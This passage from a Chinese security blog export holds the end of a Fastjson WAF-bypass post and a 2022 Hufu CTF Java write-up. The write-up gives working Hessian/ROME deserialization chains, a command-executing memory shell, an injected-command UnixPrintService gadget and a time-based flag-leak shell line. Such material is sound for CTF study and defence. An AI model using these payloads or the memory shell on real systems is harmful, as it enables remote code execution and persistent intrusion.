&quot;autoCommit&quot;:true&#125;*/</code>，这样waf就会将内容替换后识别一串空字符当然就可以绕过，而且JSON数据后⾯可以填充其他不是<code>():[]&#123;&#125;</code>等任意字符，具体可以看<code>com.alibaba.fastjson.parser.JSONLexerBase#nextToken()</code></p><p>那为什么这里<code>\u001a</code>可以绕过</p><p>从代码出发开局初始化<code>DefaultJSONParser</code>的时候，由于我们字符串开头是<code>/</code>，会调用<code>netToken</code></p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/s0.png"></p><p>这里会调用<code>skipComment</code>去除注释</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/s1.png"></p><p>可以看见如果是正常逻辑匹配到<code>*/</code>只是移动到下一字符返回</p><p><img src="/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/s2.png"></p><p>之后继续处理正常逻辑</p><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>fastjson眼中的注释<code>/**/</code>，<code>//y4tacker\n</code>，具体可以看skipComment的逻辑</p><p>因此在支持加注释的地方可以试试添加打乱特征</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//y4tacker\n&#123;//y4tacker\n&quot;@type&quot;//y4tacker\n://y4tacker\n&quot;com.test.Test&quot;//y4tacker\n&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022虎符CTF-Java部分</title>
      <link href="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/"/>
      <url>/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022虎符CTF-Java部分"><a href="#2022虎符CTF-Java部分" class="headerlink" title="2022虎符CTF-Java部分"></a>2022虎符CTF-Java部分</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    非小白文，代码基于<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目基础上进行修改</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>​    本身我是不太懂hessian的反序列化，大概去网上搜了一下配合ROME利用的思路（如果反序列化map对象，在逻辑后面通过put操作，从而触发对key调用hashCode打ROME），这里不清楚可以看看ROME利用链以及hessian反序列化的一些简单东西</p><p>​    首先简单看下docker，可以看到会导致不能出网</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;2.4&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">    image: nginx:<span class="number">1.15</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;0.0.0.0:8090:80&quot;</span></span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">        - ./nginx.conf:/etc/nginx/conf.d/<span class="keyword">default</span>.conf:ro</span><br><span class="line">    networks:</span><br><span class="line">      - internal_network</span><br><span class="line">      - out_network</span><br><span class="line">  web:</span><br><span class="line">    build: ./</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">        - ./flag:/flag:ro</span><br><span class="line">    networks:</span><br><span class="line">      - internal_network</span><br><span class="line">networks:</span><br><span class="line">    internal_network:</span><br><span class="line">        internal: <span class="keyword">true</span></span><br><span class="line">        ipam:</span><br><span class="line">            driver: <span class="keyword">default</span></span><br><span class="line">    out_network:</span><br><span class="line">        ipam:</span><br><span class="line">            driver: <span class="keyword">default</span></span><br></pre></td></tr></table></figure><p>nginx.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">proxy_pass http://web:8090;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用一：SignedObject实现二次反序列化"><a href="#利用一：SignedObject实现二次反序列化" class="headerlink" title="利用一：SignedObject实现二次反序列化"></a>利用一：SignedObject实现二次反序列化</h3><p>既然不出网那就无法配合JNDI去利用了（网上主流的利用），后面尝试了TemplatesImpl，在Hessian的一些限制下(有空自己去看源码)，导致被<code>transient</code>修饰的<code>_tfactory</code>对象无法写入造成空指针异常，为什么呢,自己看图可以看到不仅仅是被<code>transient</code>修饰，同时静态变量也不行，这里导致另一个利用链不能打，这里不提</p><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/4.png"></p><p>之后解决思路就是找个二次反序列化的点触发原生反序列化即可，最后找到个<code>java.security.SignedObject#SignedObject</code>,里面的getObject可以触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    ByteArrayInputStream b = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.content);</span><br><span class="line">    ObjectInput a = <span class="keyword">new</span> ObjectInputStream(b);</span><br><span class="line">    Object obj = a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候聪明的你一定想问，为什么原生反序列化就可以恢复这个<code>trasient</code>修饰的变量呢，答案如下<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#readObject</code>,重写了readOBject方法</p><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/8.png"></p><p>因此得到下面简单的payload，下面payload有一些地方还可以完善变得更好，但是我懒</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> marshalsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> marshalsec.gadgets.JDKUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> marshalsec.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = ClassPool.getDefault().get(<span class="string">&quot;Yyds&quot;</span>).toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">         setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        ToStringBean bean = <span class="keyword">new</span> ToStringBean(Templates.class,templates);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,bean);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        KeyPair keyPair = keyPairGenerator.genKeyPair();</span><br><span class="line">        PrivateKey privateKey = keyPair.getPrivate();</span><br><span class="line">        Signature signingEngine = Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        SignedObject so = <span class="keyword">null</span>;</span><br><span class="line">        so = <span class="keyword">new</span> SignedObject(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ObjectBean delegate = <span class="keyword">new</span> ObjectBean(SignedObject.class, so);</span><br><span class="line">        ObjectBean root  = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output output = <span class="keyword">new</span> Hessian2Output(os);</span><br><span class="line">        output.writeObject(map);</span><br><span class="line">        output.getBytesOutputStream().flush();</span><br><span class="line">        output.completeMessage();</span><br><span class="line">        output.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(os.toByteArray())));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以实现执行反序列化打<code>TemplatesImpl</code>加载恶意代码了，接下来既然不出网，比较方便的就是去注入内存马</p><p>按照经验来讲Web中间件是多线程的应用，一般requst对象都会存储在线程对象中，可以通过<code>Thread.currentThread()</code>或<code>Thread.getThreads()</code>获取，按照这个思路写就行了</p><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/5.png"><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/6.png"></p><p>我是懒狗之间暴力替换handler(继承AbstractTranslet实现HttpHandler)，嫌弃麻烦可以自己加路由可以让代码更短，还可以放到静态块防止触发两次，一句话我懒自己改去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpContext;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Yyds</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String response = <span class="string">&quot;Y4tacker&#x27;s MemoryShell&quot;</span>;</span><br><span class="line">        String query = t.getRequestURI().getQuery();</span><br><span class="line">        String[] var3 = query.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        System.out.println(var3[<span class="number">0</span>]+var3[<span class="number">1</span>]);</span><br><span class="line">        ByteArrayOutputStream output = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (var3[<span class="number">0</span>].equals(<span class="string">&quot;y4tacker&quot;</span>))&#123;</span><br><span class="line">            InputStream inputStream = Runtime.getRuntime().exec(var3[<span class="number">1</span>]).getInputStream();</span><br><span class="line">            output = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != (n = inputStream.read(buffer))) &#123;</span><br><span class="line">                output.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response+=(<span class="string">&quot;\n&quot;</span>+<span class="keyword">new</span> String(output.toByteArray()));</span><br><span class="line">        t.sendResponseHeaders(<span class="number">200</span>, (<span class="keyword">long</span>)response.length());</span><br><span class="line">        OutputStream os = t.getResponseBody();</span><br><span class="line">        os.write(response.getBytes());</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Yyds</span><span class="params">()</span> <span class="keyword">throws</span> Exception  </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Object obj = Thread.currentThread();</span><br><span class="line">            Field field = obj.getClass().getDeclaredField(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = obj.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line">            Thread[] threads = (Thread[]) obj;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;Thread-2&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        field = thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(thread);</span><br><span class="line">                        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">&quot;contexts&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">&quot;list&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line">                        java.util.LinkedList lt = (java.util.LinkedList)obj;</span><br><span class="line">                        Object o = lt.get(<span class="number">0</span>);</span><br><span class="line">                        field = o.getClass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        field.set(o,<span class="keyword">this</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实可以去静态块改一下，不然执行两次多多少少有点烦，就这样了so easy</p><p>当然太暴力了也不好哈哈哈，还可以在上面的<code>sun.net.httpserver.ServerImpl$Dispatcher</code>直接执行<code>sun.net.httpserver.ServerImpl#createContext(java.lang.String, com.sun.net.httpserver.HttpHandler)</code>创建新的路由即可</p><p>这里就不写了，一个字懒，反正也不难</p><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/1.jpg"></p><h3 id="利用二：UnixPrintService直接执行命令"><a href="#利用二：UnixPrintService直接执行命令" class="headerlink" title="利用二：UnixPrintService直接执行命令"></a>利用二：UnixPrintService直接执行命令</h3><p>之前不清楚，后面@wuyx师傅提醒我才发现可以不用实现序列化接口，具体可以参考marshalsec的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HessianBase.NoWriteReplaceSerializerFactory sf = <span class="keyword">new</span> HessianBase.NoWriteReplaceSerializerFactory();</span><br><span class="line">sf.setAllowNonSerializable(<span class="keyword">true</span>);</span><br><span class="line">output.setSerializerFactory(sf);</span><br></pre></td></tr></table></figure><p>在<code>sun.print.UnixPrintService</code>的所有get方法都能触发，别看这个是Unix其实linux也有，在高版本被移除(有兴趣自己考古)，利用方式就是简单命令拼接执行（缺点就是太能弹了，基本上每个get方法都能弹）</p><p><img src="/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/7.png"></p><p>它会去找public修饰的getter方法，而为什么会调用哪个私有方法其实也很简单比如说getAttributes里面就调用了这些触发命令执行的私有方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PrintServiceAttributeSet <span class="title">getAttributes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HashPrintServiceAttributeSet var1 = <span class="keyword">new</span> HashPrintServiceAttributeSet();</span><br><span class="line">        var1.add(<span class="keyword">this</span>.getPrinterName());</span><br><span class="line">        var1.add(<span class="keyword">this</span>.getPrinterIsAcceptingJobs());</span><br><span class="line">        PrinterState var2 = <span class="keyword">this</span>.getPrinterState();</span><br><span class="line">        <span class="keyword">if</span> (var2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var1.add(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PrinterStateReasons var3 = <span class="keyword">this</span>.getPrinterStateReasons();</span><br><span class="line">        <span class="keyword">if</span> (var3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            var1.add(var3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var1.add(<span class="keyword">this</span>.getQueuedJobCount());</span><br><span class="line">        <span class="keyword">return</span> AttributeSetUtilities.unmodifiableView(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ObjectBean delegate = <span class="keyword">new</span> ObjectBean(sun.print.UnixPrintService.class,</span><br><span class="line"></span><br><span class="line">declaredConstructor.newInstance(<span class="string">&quot;;open -na Calculator&quot;</span>));</span><br><span class="line"></span><br><span class="line">ObjectBean root  = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">Hessian2Output output = <span class="keyword">new</span> Hessian2Output(os);</span><br><span class="line">HessianBase.NoWriteReplaceSerializerFactory sf = <span class="keyword">new</span> HessianBase.NoWriteReplaceSerializerFactory();</span><br><span class="line">sf.setAllowNonSerializable(<span class="keyword">true</span>);</span><br><span class="line">output.setSerializerFactory(sf);</span><br><span class="line">output.writeObject(map);</span><br><span class="line">output.getBytesOutputStream().flush();</span><br><span class="line">output.completeMessage();</span><br><span class="line">output.close();</span><br><span class="line">System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(os.toByteArray())));</span><br></pre></td></tr></table></figure><p>拿flag的话就两种方式<code>JavaAgent</code>注入内存马，或者本来就是ctf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `cut -c <span class="number">1</span> flag` = <span class="string">&quot;a&quot;</span> ];then sleep <span class="number">2</span>;fi</span><br></pre></td></tr></table></figure><h2 id="如何快速拿利用链"><a href="#如何快速拿利用链" class="headerlink" title="如何快速拿利用链"></a>如何快速拿利用链</h2><p>在这次比赛后我简单学习了下用tabby，通过下面的neo4j查询语句，之后人工排查下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> path<span class="operator">=</span>(m1:<span class="keyword">Method</span>)<span class="operator">-</span>[:<span class="keyword">CALL</span><span class="operator">*</span>.<span class="number">.3</span>]<span class="operator">-</span><span class="operator">&gt;</span>(m2:<span class="keyword">Method</span> &#123;&#125;) <span class="keyword">where</span> m1.NAME <span class="operator">=</span><span class="operator">~</span> &quot;get.*&quot; <span class="keyword">and</span> m1.PARAMETER_SIZE<span class="operator">=</span><span class="number">0</span> <span class="keyword">and</span> (m2.NAME <span class="operator">=</span><span class="operator">~</span> &quot;exec.*&quot; <span class="keyword">or</span> m2.NAME <span class="operator">=</span><span class="operator">~</span> &quot;readObject&quot;) <span 